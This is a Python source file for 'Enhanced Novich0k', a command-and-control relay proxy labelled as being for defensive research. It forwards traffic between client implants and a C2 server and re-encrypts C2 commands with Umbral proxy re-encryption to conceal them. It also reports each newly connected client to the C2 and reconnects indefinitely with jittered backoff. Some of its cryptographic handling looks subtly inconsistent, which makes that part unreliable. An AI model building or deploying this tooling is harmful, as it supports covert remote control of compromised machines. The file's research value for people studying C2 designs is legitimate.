#!/usr/bin/env python3
# Enhanced Novich0k - Umbral PRE-Based C2 Proxy Implementation
# For defensive security research purposes only

import socket
import threading
import time
import json
import base64
import os
import sys
import argparse
import logging
import random
from datetime import datetime

# Import Umbral PRE libraries
from umbral import SecretKey, PublicKey, Signer
from umbral.curve import SECP256K1
from umbral.pre import encrypt, decrypt_original, decrypt_reencrypted, reencrypt
from umbral import Capsule, CapsuleFrag, KeyFrag

# Import utility modules
from utils.serialization import serialize_object, deserialize_object, create_message, validate_message
from utils.error_types import NovichokError, DeserializationError, SerializationError, VersionError, CapsuleError
from utils.message_buffer import MessageBuffer
from utils.schema_validation import validate_json_schema
from utils.connection import send_message_with_retry, receive_message_with_timeout

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("novich0k_proxy.log")
    ]
)

logger = logging.getLogger("Novich0k-Proxy")

class UmbralPRE:
    """Simplified wrapper for Umbral PRE operations with improved error handling"""
    
    def __init__(self):
        """Initialize Umbral parameters"""
        # Set default curve parameters
        self.params = SECP256K1
    
    def generate_keys(self):
        """Generate a keypair for a participant with enhanced error handling"""
        try:
            # Generate private key
            private_key = SecretKey.random()
            
            # Generate corresponding public key
            public_key = private_key.public_key()
            
            # Generate signing keys
            signing_private_key = SecretKey.random()
            signing_public_key = signing_private_key.public_key()
            signer = Signer(signing_private_key)
            
            return {
                'private_key': private_key,
                'public_key': public_key,
                'signing_key': signing_private_key,
                'verifying_key': signing_public_key,
                'signer': signer
            }
        except Exception as e:
            logger.error(f"Error generating keys: {e}")
            raise


class ProxyServer:
    """Enhanced proxy server with Umbral PRE capabilities"""
    
    def __init__(self, listen_host='127.0.0.1', listen_port=8889,
                 server_host='127.0.0.1', server_port=8888):
        """Initialize the proxy server"""
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.server_host = server_host
        self.server_port = server_port
        self.proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.proxy_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Client connections and mappings
        self.client_connections = {}  # client_id -> (client_socket, server_socket, buffer)
        self.socket_to_client = {}    # client_socket -> client_id
        self.client_buffers = {}      # client_id -> MessageBuffer
        
        # Initialize Umbral PRE
        self.pre = UmbralPRE()
        
        # Generate proxy keys
        self.keys = self.pre.generate_keys()
        
        # Storage for delegations from C2 server
        self.delegations = {}  # delegating_pk -> {kfrags, delegating_pk}
        
        # Registration status
        self.registered_with_c2 = False
        
        # C2 server connection
        self.c2_socket = None
        self.c2_buffer = MessageBuffer()
        
        # Connection state
        self.running = True
        self.reconnect_delay = 5  # Base delay in seconds
        self.max_reconnect_delay = 60  # Maximum delay in seconds
        self.reconnect_attempts = 0
        self.max_reconnect_attempts = 0  # 0 = unlimited attempts
        
        logger.info(f"Proxy Server initialized to listen on {listen_host}:{listen_port}")
        logger.info(f"Will forward to C2 server at {server_host}:{server_port}")
    
    def start(self):
        """Start the proxy server"""
        try:
            # Bind to the listening port
            self.proxy_socket.bind((self.listen_host, self.listen_port))
            self.proxy_socket.listen(5)
            logger.info(f"Proxy listening on {self.listen_host}:{self.listen_port}")
            
            # Start connection maintenance thread
            maintenance_thread = threading.Thread(target=self.maintain_c2_connection)
            maintenance_thread.daemon = True
            maintenance_thread.start()
            
            # Register with the C2 server
            registration_thread = threading.Thread(target=self.register_with_c2)
            registration_thread.daemon = True
            registration_thread.start()
            
            # Main loop to accept client connections
            print(f"[*] Proxy server running on {self.listen_host}:{self.listen_port}")
            print(f"[*] Forwarding to C2 server at {self.server_host}:{self.server_port}")
            print("[*] Waiting for client connections...")
            
            while self.running:
                try:
                    # Set a timeout so we can check running flag periodically
                    self.proxy_socket.settimeout(1.0)
                    try:
                        client_socket, address = self.proxy_socket.accept()
                        logger.info(f"New connection from {address[0]}:{address[1]}")
                        print(f"[+] New connection from {address[0]}:{address[1]}")
                        
                        # Start a thread to handle this connection
                        client_thread = threading.Thread(
                            target=self.handle_connection,
                            args=(client_socket, address)
                        )
                        client_thread.daemon = True
                        client_thread.start()
                    except socket.timeout:
                        # This is expected due to the timeout
                        continue
                except Exception as e:
                    if self.running:  # Only log if not shutting down
                        logger.error(f"Error accepting client connection: {e}")
                        print(f"[!] Error accepting client connection: {e}")
                        time.sleep(1)  # Prevent tight error loop
                
        except KeyboardInterrupt:
            logger.info("Proxy server interrupted by user")
            print("\n[*] Shutting down proxy...")
            self.shutdown()
        except Exception as e:
            logger.error(f"Error in proxy server: {e}")
            print(f"[!] Error: {e}")
            self.shutdown()
    
    def shutdown(self):
        """Shutdown the proxy server gracefully"""
        self.running = False
        
        # Close all client connections
        for client_id, (client_socket, server_socket, _) in list(self.client_connections.items()):
            try:
                client_socket.close()
                server_socket.close()
            except:
                pass
        
        # Close the C2 server connection
        if self.c2_socket:
            try:
                self.c2_socket.close()
            except:
                pass
            self.c2_socket = None
        
        # Close the listening socket
        try:
            self.proxy_socket.close()
        except:
            pass
        
        logger.info("Proxy server shut down")
    
    def is_c2_connected(self):
        """Check if the C2 server connection is still active"""
        if not self.c2_socket:
            return False
        
        try:
            # Non-blocking way to check connection status
            self.c2_socket.getpeername()
            return True
        except:
            return False
    
    def maintain_c2_connection(self):
        """Keep the C2 server connection alive with automatic reconnection"""
        while self.running:
            try:
                if not self.is_c2_connected() and not self.registered_with_c2:
                    # Only log if we need to reconnect but aren't already trying
                    if self.reconnect_attempts == 0:
                        logger.info("C2 server connection lost, will attempt to reconnect")
                    
                    # Sleep before checking again to avoid tight loop
                    time.sleep(5)
                else:
                    # Connection is good, sleep longer
                    time.sleep(30)
                    
            except Exception as e:
                logger.error(f"Error in connection maintenance: {e}")
                time.sleep(5)
    
    def register_with_c2(self):
        """Register the proxy with the C2 server to get re-encryption keys"""
        self.reconnect_attempts = 0
        
        while self.running and not self.registered_with_c2:
            try:
                # Check if we're already at the maximum number of attempts
                if self.max_reconnect_attempts > 0 and self.reconnect_attempts >= self.max_reconnect_attempts:
                    logger.error(f"Max reconnection attempts ({self.max_reconnect_attempts}) reached. Giving up.")
                    print(f"[!] Failed to register with C2 server after {self.max_reconnect_attempts} attempts.")
                    # Continue running but don't try to register again
                    break
                
                # Increment attempt counter
                self.reconnect_attempts += 1
                
                # Apply exponential backoff with jitter
                if self.reconnect_attempts > 1:  # Skip delay on first attempt
                    jitter = random.uniform(0.8, 1.2)
                    current_delay = min(self.reconnect_delay * jitter, self.max_reconnect_delay)
                    
                    logger.info(f"Attempting to register with C2 server in {current_delay:.1f} seconds (attempt {self.reconnect_attempts})")
                    print(f"[*] Attempting to register with C2 server in {current_delay:.1f} seconds (attempt {self.reconnect_attempts})...")
                    
                    # Wait before attempting to reconnect
                    time.sleep(current_delay)
                
                logger.info(f"Attempting to register with C2 server (attempt {self.reconnect_attempts})")
                
                # Close any existing socket
                if self.c2_socket:
                    try:
                        self.c2_socket.close()
                    except:
                        pass
                    self.c2_socket = None
                
                # Reset the buffer
                self.c2_buffer.clear()
                
                # Connect to the C2 server
                self.c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.c2_socket.connect((self.server_host, self.server_port))
                
                # Send proxy's public key with the new message format
                registration_data = create_message({
                    'proxy_registration': True,
                    'public_key': serialize_object(self.keys['public_key'], "key"),
                    'verifying_key': serialize_object(self.keys['verifying_key'], "key")
                }, "proxy_registration")
                
                send_message_with_retry(self.c2_socket, registration_data)
                logger.info("Sent registration data to C2 server")
                
                # Receive C2's response with kfrags
                response_data = receive_message_with_timeout(self.c2_socket, self.c2_buffer)
                
                if not response_data:
                    logger.error("No response from C2 server during registration")
                    continue
                
                try:
                    # Validate the message format
                    validate_message(response_data)
                except Exception as e:
                    logger.error(f"Invalid message format from C2 server: {e}")
                    continue
                
                message_type = response_data.get("message_type")
                payload = response_data.get("payload", {})
                
                if message_type == "proxy_registration_response" and payload.get("status") == "registered":
                    # Store the delegation information
                    try:
                        delegating_pk = payload.get("delegating_pk")
                        kfrags = payload.get("kfrags")
                        threshold = payload.get("threshold")
                        
                        if not delegating_pk or not kfrags or not threshold:
                            raise DeserializationError("Missing required fields in registration response")
                        
                        self.delegations[delegating_pk] = {
                            'kfrags': kfrags,
                            'delegating_pk': delegating_pk,
                            'threshold': threshold
                        }
                        
                        self.registered_with_c2 = True
                        self.reconnect_attempts = 0  # Reset for future reconnections
                        self.reconnect_delay = 5  # Reset delay
                        
                        logger.info("Successfully registered with C2 server")
                        print("[+] Successfully registered with C2 server")
                        
                        # Keep connection for server updates
                        server_update_thread = threading.Thread(
                            target=self.listen_for_server_updates,
                            args=(self.c2_socket,)
                        )
                        server_update_thread.daemon = True
                        server_update_thread.start()
                        
                        return
                    except Exception as e:
                        logger.error(f"Error processing registration response: {e}")
                        continue
                else:
                    logger.error("Failed to register with C2 server")
                    print(f"[!] Failed to register with C2 server: {payload.get('error', 'Unknown error')}")
                    self.c2_socket.close()
                    self.c2_socket = None
                    
                    # Increase backoff delay for next attempt
                    self.reconnect_delay = min(self.reconnect_delay * 1.5, self.max_reconnect_delay)
            
            except Exception as e:
                logger.error(f"Error registering with C2 server: {e}")
                print(f"[!] Error registering with C2 server: {e}")
                if self.c2_socket:
                    try:
                        self.c2_socket.close()
                    except:
                        pass
                    self.c2_socket = None
                
                # Increase backoff delay for next attempt
                self.reconnect_delay = min(self.reconnect_delay * 1.5, self.max_reconnect_delay)
        
        if not self.registered_with_c2 and self.running:
            logger.warning("Proxy will run in forwarding-only mode (no re-encryption)")
            print("[!] Proxy will run in forwarding-only mode (no re-encryption)")
    
    def listen_for_server_updates(self, server_socket):
        """Listen for updates from the C2 server (new kfrags, etc.)"""
        try:
            while self.running:
                # Receive message with timeout
                message = receive_message_with_timeout(server_socket, self.c2_buffer)
                
                if not message:
                    # No valid message received, check if socket is still connected
                    try:
                        server_socket.getpeername()
                    except:
                        # Socket disconnected
                        logger.warning("Connection to C2 server closed")
                        print("[!] Connection to C2 server closed")
                        break
                    continue
                
                try:
                    # Validate the message format
                    validate_message(message)
                except Exception as e:
                    logger.error(f"Invalid message format from C2 server: {e}")
                    continue
                
                message_type = message.get("message_type")
                payload = message.get("payload", {})
                
                # Handle key fragment updates
                if message_type == "kfrag_update":
                    try:
                        delegating_pk = payload.get("delegating_pk")
                        new_kfrags = payload.get("kfrags")
                        
                        if not delegating_pk or not new_kfrags:
                            logger.error("Invalid kfrag update: missing required fields")
                            continue
                        
                        self.delegations[delegating_pk] = {
                            'kfrags': new_kfrags,
                            'delegating_pk': delegating_pk
                        }
                        
                        logger.info(f"Updated kfrags for delegator: {delegating_pk[:10]}...")
                        print(f"[+] Updated key fragments from C2 server")
                    except Exception as e:
                        logger.error(f"Error processing kfrag update: {e}")
        
        except Exception as e:
            logger.error(f"Error in server update listener: {e}")
            print(f"[!] Error in server communication: {e}")
        finally:
            try:
                server_socket.close()
            except:
                pass
                
            self.c2_socket = None
            self.registered_with_c2 = False
            
            if self.running:
                # Delay before trying to reconnect
                time.sleep(5)
                # Try to reconnect if the connection was lost
                logger.info("Re-initiating registration with C2 server")
                registration_thread = threading.Thread(target=self.register_with_c2)
                registration_thread.daemon = True
                registration_thread.start()
    
    def handle_connection(self, client_socket, client_address):
        """Handle a client connection to the proxy"""
        client_id = f"{client_address[0]}:{client_address[1]}"
        server_socket = None
        client_buffer = MessageBuffer()
        server_buffer = MessageBuffer()
        
        try:
            # First, receive initial data from the client
            initial_message = receive_message_with_timeout(client_socket, client_buffer, timeout=10)
            
            if not initial_message:
                logger.warning(f"No valid initial message received from {client_id}")
                client_socket.close()
                return
            
            # Connect to the C2 server
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((self.server_host, self.server_port))
            
            # Forward the initial message to the server
            send_message_with_retry(server_socket, initial_message)
            
            # Store the connection mappings
            self.client_connections[client_id] = (client_socket, server_socket, client_buffer)
            self.socket_to_client[client_socket] = client_id
            self.client_buffers[client_id] = server_buffer
            
            # Wait for server's response to initial data
            initial_response = receive_message_with_timeout(server_socket, server_buffer, timeout=10)
            
            if initial_response:
                # Forward this response back to the client
                send_message_with_retry(client_socket, initial_response)
                
                # Try to extract client ID if this was a key exchange
                if initial_response.get("message_type") == "key_exchange_response":
                    # If this was a successful key exchange, report to C2 server
                    if self.is_c2_connected() and self.registered_with_c2:
                        report = create_message({
                            'client_id': client_id,
                            'timestamp': datetime.now().isoformat()
                        }, "new_client_report")
                        try:
                            send_message_with_retry(self.c2_socket, report)
                            logger.info(f"Reported new client {client_id} to C2 server")
                        except Exception as e:
                            logger.error(f"Error reporting new client to C2 server: {e}")
            
            # Now set up continuous forwarding threads
            c2s_thread = threading.Thread(
                target=self.forward_client_to_server,
                args=(client_socket, server_socket, client_id, client_buffer)
            )
            s2c_thread = threading.Thread(
                target=self.forward_server_to_client,
                args=(server_socket, client_socket, client_id, server_buffer)
            )
            
            c2s_thread.daemon = True
            s2c_thread.daemon = True
            
            c2s_thread.start()
            s2c_thread.start()
            
            # Wait for both threads to complete
            c2s_thread.join()
            s2c_thread.join()
            
        except Exception as e:
            logger.error(f"Error handling connection for {client_id}: {e}")
            print(f"[!] Error handling connection for {client_id}: {e}")
        finally:
            # Clean up the connection
            if client_id in self.client_connections:
                del self.client_connections[client_id]
            
            if client_socket in self.socket_to_client:
                del self.socket_to_client[client_socket]
            
            if client_id in self.client_buffers:
                del self.client_buffers[client_id]
            
            try:
                client_socket.close()
            except:
                pass
                
            if server_socket:
                try:
                    server_socket.close()
                except:
                    pass
                    
            logger.info(f"Connection closed for {client_id}")
    
    def forward_client_to_server(self, client_socket, server_socket, client_id, buffer):
        """Forward traffic from client to server"""
        try:
            while self.running:
                try:
                    # Receive data from client with improved message handling
                    message = receive_message_with_timeout(client_socket, buffer)
                    
                    if not message:
                        # No valid message received, check if socket is still connected
                        try:
                            client_socket.getpeername()
                        except:
                            # Socket disconnected
                            logger.info(f"Client {client_id} disconnected")
                            break
                        continue
                    
                    # Forward the message to the server
                    send_message_with_retry(server_socket, message)
                    
                except Exception as e:
                    logger.error(f"Error forwarding client->server for {client_id}: {e}")
                    break
                
        except Exception as e:
            logger.error(f"Error forwarding client->server for {client_id}: {e}")
        finally:
            logger.info(f"Client->server forwarding ended for {client_id}")
    
    def forward_server_to_client(self, server_socket, client_socket, client_id, buffer):
        """Forward traffic from server to client with re-encryption when applicable"""
        try:
            while self.running:
                try:
                    # Receive data from server with improved message handling
                    message = receive_message_with_timeout(server_socket, buffer)
                    
                    if not message:
                        # No valid message received, check if socket is still connected
                        try:
                            server_socket.getpeername()
                        except:
                            # Socket disconnected
                            logger.info(f"Server disconnected from {client_id}")
                            break
                        continue
                    
                    try:
                        # Validate the message format
                        validate_message(message)
                        
                        message_type = message.get("message_type")
                        payload = message.get("payload", {})
                        
                        # Check if this is a command that needs re-encryption
                        if message_type == "command" and payload.get("command") and self.registered_with_c2:
                            if payload.get("use_proxy", False) and "encrypted_data" in payload:
                                # This command is flagged for re-encryption
                                logger.info(f"Re-encrypting command for {client_id}")
                                modified_message = self.reencrypt_command(message)
                                
                                if modified_message:
                                    # Send the re-encrypted command
                                    send_message_with_retry(client_socket, modified_message)
                                    continue
                        
                        # For all other cases, forward unchanged
                        send_message_with_retry(client_socket, message)
                        
                    except VersionError as e:
                        logger.error(f"Protocol version error: {e}")
                        # Forward unchanged on error
                        send_message_with_retry(client_socket, message)
                    except Exception as e:
                        logger.error(f"Error processing message: {e}")
                        # Forward unchanged on error
                        send_message_with_retry(client_socket, message)
                    
                except Exception as e:
                    logger.error(f"Error forwarding server->client for {client_id}: {e}")
                    break
                
        except Exception as e:
            logger.error(f"Error forwarding server->client for {client_id}: {e}")
        finally:
            logger.info(f"Server->client forwarding ended for {client_id}")
    
    def reencrypt_command(self, message):
        """Re-encrypt a command from the server to the client with improved error handling"""
        try:
            # Extract the payload
            payload = message.get("payload", {})
            
            # Extract the encrypted data
            encrypted_data = payload.get("encrypted_data")
            if not encrypted_data:
                raise DeserializationError("Missing encrypted data in command")
            
            # Get the delegating public key
            delegating_pk = payload.get("delegating_pk")
            
            if not delegating_pk and "delegating_pk" in encrypted_data:
                # Try to get the delegating key from the encrypted data if not in the main message
                delegating_pk = encrypted_data.get("delegating_pk")
            
            if not delegating_pk:
                # If still not found, try to use any key we have delegations for
                if self.delegations:
                    delegating_pk = list(self.delegations.keys())[0]
                else:
                    logger.error("No delegation key found for re-encryption")
                    return None
            
            if delegating_pk not in self.delegations:
                logger.error("No delegation found for the specified public key")
                return None
            
            delegation = self.delegations[delegating_pk]
            
            # Deserialize the capsule
            try:
                capsule_bytes = base64.b64decode(encrypted_data["capsule"])
                capsule = Capsule.from_bytes(capsule_bytes)
            except Exception as e:
                raise CapsuleError(f"Invalid capsule format: {e}")
            
            # Get key fragments for this delegator
            try:
                kfrags_data = delegation.get("kfrags", [])
                kfrags = [KeyFrag.from_bytes(base64.b64decode(kf)) for kf in kfrags_data]
            except Exception as e:
                raise DeserializationError(f"Error deserializing key fragments: {e}")
            
            # Determine threshold
            threshold = payload.get("threshold", len(kfrags) // 2 + 1)
            threshold = min(threshold, len(kfrags))
            
            # Choose a random subset of kfrags to use
            chosen_kfrags = random.sample(kfrags, threshold)
            
            # Generate capsule fragments by re-encrypting
            try:
                cfrags = []
                for kfrag in chosen_kfrags:
                    verified_kfrag = kfrag.verify(
                        self.keys['verifying_key'],
                        deserialize_object(delegating_pk, "key"),
                        self.keys['public_key']
                    )
                    cfrag = reencrypt(capsule=capsule, kfrag=verified_kfrag)
                    # Note: diagnostic script showed that cfrag is already a bytes object
                    # in this version of Umbral, so no conversion is needed
                    cfrags.append(base64.b64encode(cfrag).decode())
            except Exception as e:
                raise CapsuleError(f"Error generating capsule fragments: {e}")
            
            # Create the re-encrypted package
            proxy_package = {
                'ciphertext': encrypted_data['ciphertext'],
                'capsule': base64.b64encode(capsule).decode(),  # capsule is already bytes
                'cfrags': cfrags,
                'delegating_pk': delegating_pk,
                're_encrypted': True,
                'threshold': threshold
            }
            
            # Create the final message
            return create_message({
                'command': True,
                'proxy_package': proxy_package
            }, "command")
            
        except CapsuleError as e:
            logger.error(f"Capsule error during re-encryption: {e}")
            return None
        except DeserializationError as e:
            logger.error(f"Deserialization error during re-encryption: {e}")
            return None
        except Exception as e:
            logger.error(f"Unexpected error during re-encryption: {e}")
            return None


def check_dependencies():
    """Check if all required dependencies are installed"""
    required = ["umbral", "socket", "json", "base64"]
    missing = []
    
    for module in required:
        try:
            __import__(module)
        except ImportError:
            missing.append(module)
    
    if missing:
        print(f"[!] Missing dependencies: {', '.join(missing)}")
        print("[*] Install dependencies with: pip install " + " ".join(missing))
        return False
    
    return True


def main():
    """Main function to run the proxy server"""
    parser = argparse.ArgumentParser(description="Enhanced Umbral PRE-Based C2 Proxy")
    parser.add_argument("--listen-host", default="127.0.0.1", help="Host to listen on")
    parser.add_argument("--listen-port", type=int, default=8889, help="Port to listen on")
    parser.add_argument("--server-host", default="127.0.0.1", help="C2 server host")
    parser.add_argument("--server-port", type=int, default=8888, help="C2 server port")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    parser.add_argument("--max-reconnect", type=int, default=0, 
                        help="Maximum reconnection attempts (0 = unlimited)")
    
    args = parser.parse_args()
    
    # Configure logging level
    if args.debug:
        logger.setLevel(logging.DEBUG)
    
    # Check dependencies
    if not check_dependencies():
        print("[!] Missing dependencies. Please install them and try again.")
        return
    
    print("\n=== Enhanced Novich0k - Umbral PRE-Based C2 Proxy ===")
    print("For defensive security research purposes only")
    
    try:
        proxy = ProxyServer(
            listen_host=args.listen_host,
            listen_port=args.listen_port,
            server_host=args.server_host,
            server_port=args.server_port
        )
        proxy.max_reconnect_attempts = args.max_reconnect
        
        # Start the proxy server
        proxy.start()
    except KeyboardInterrupt:
        print("\n[*] Proxy interrupted by user. Exiting...")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    main()
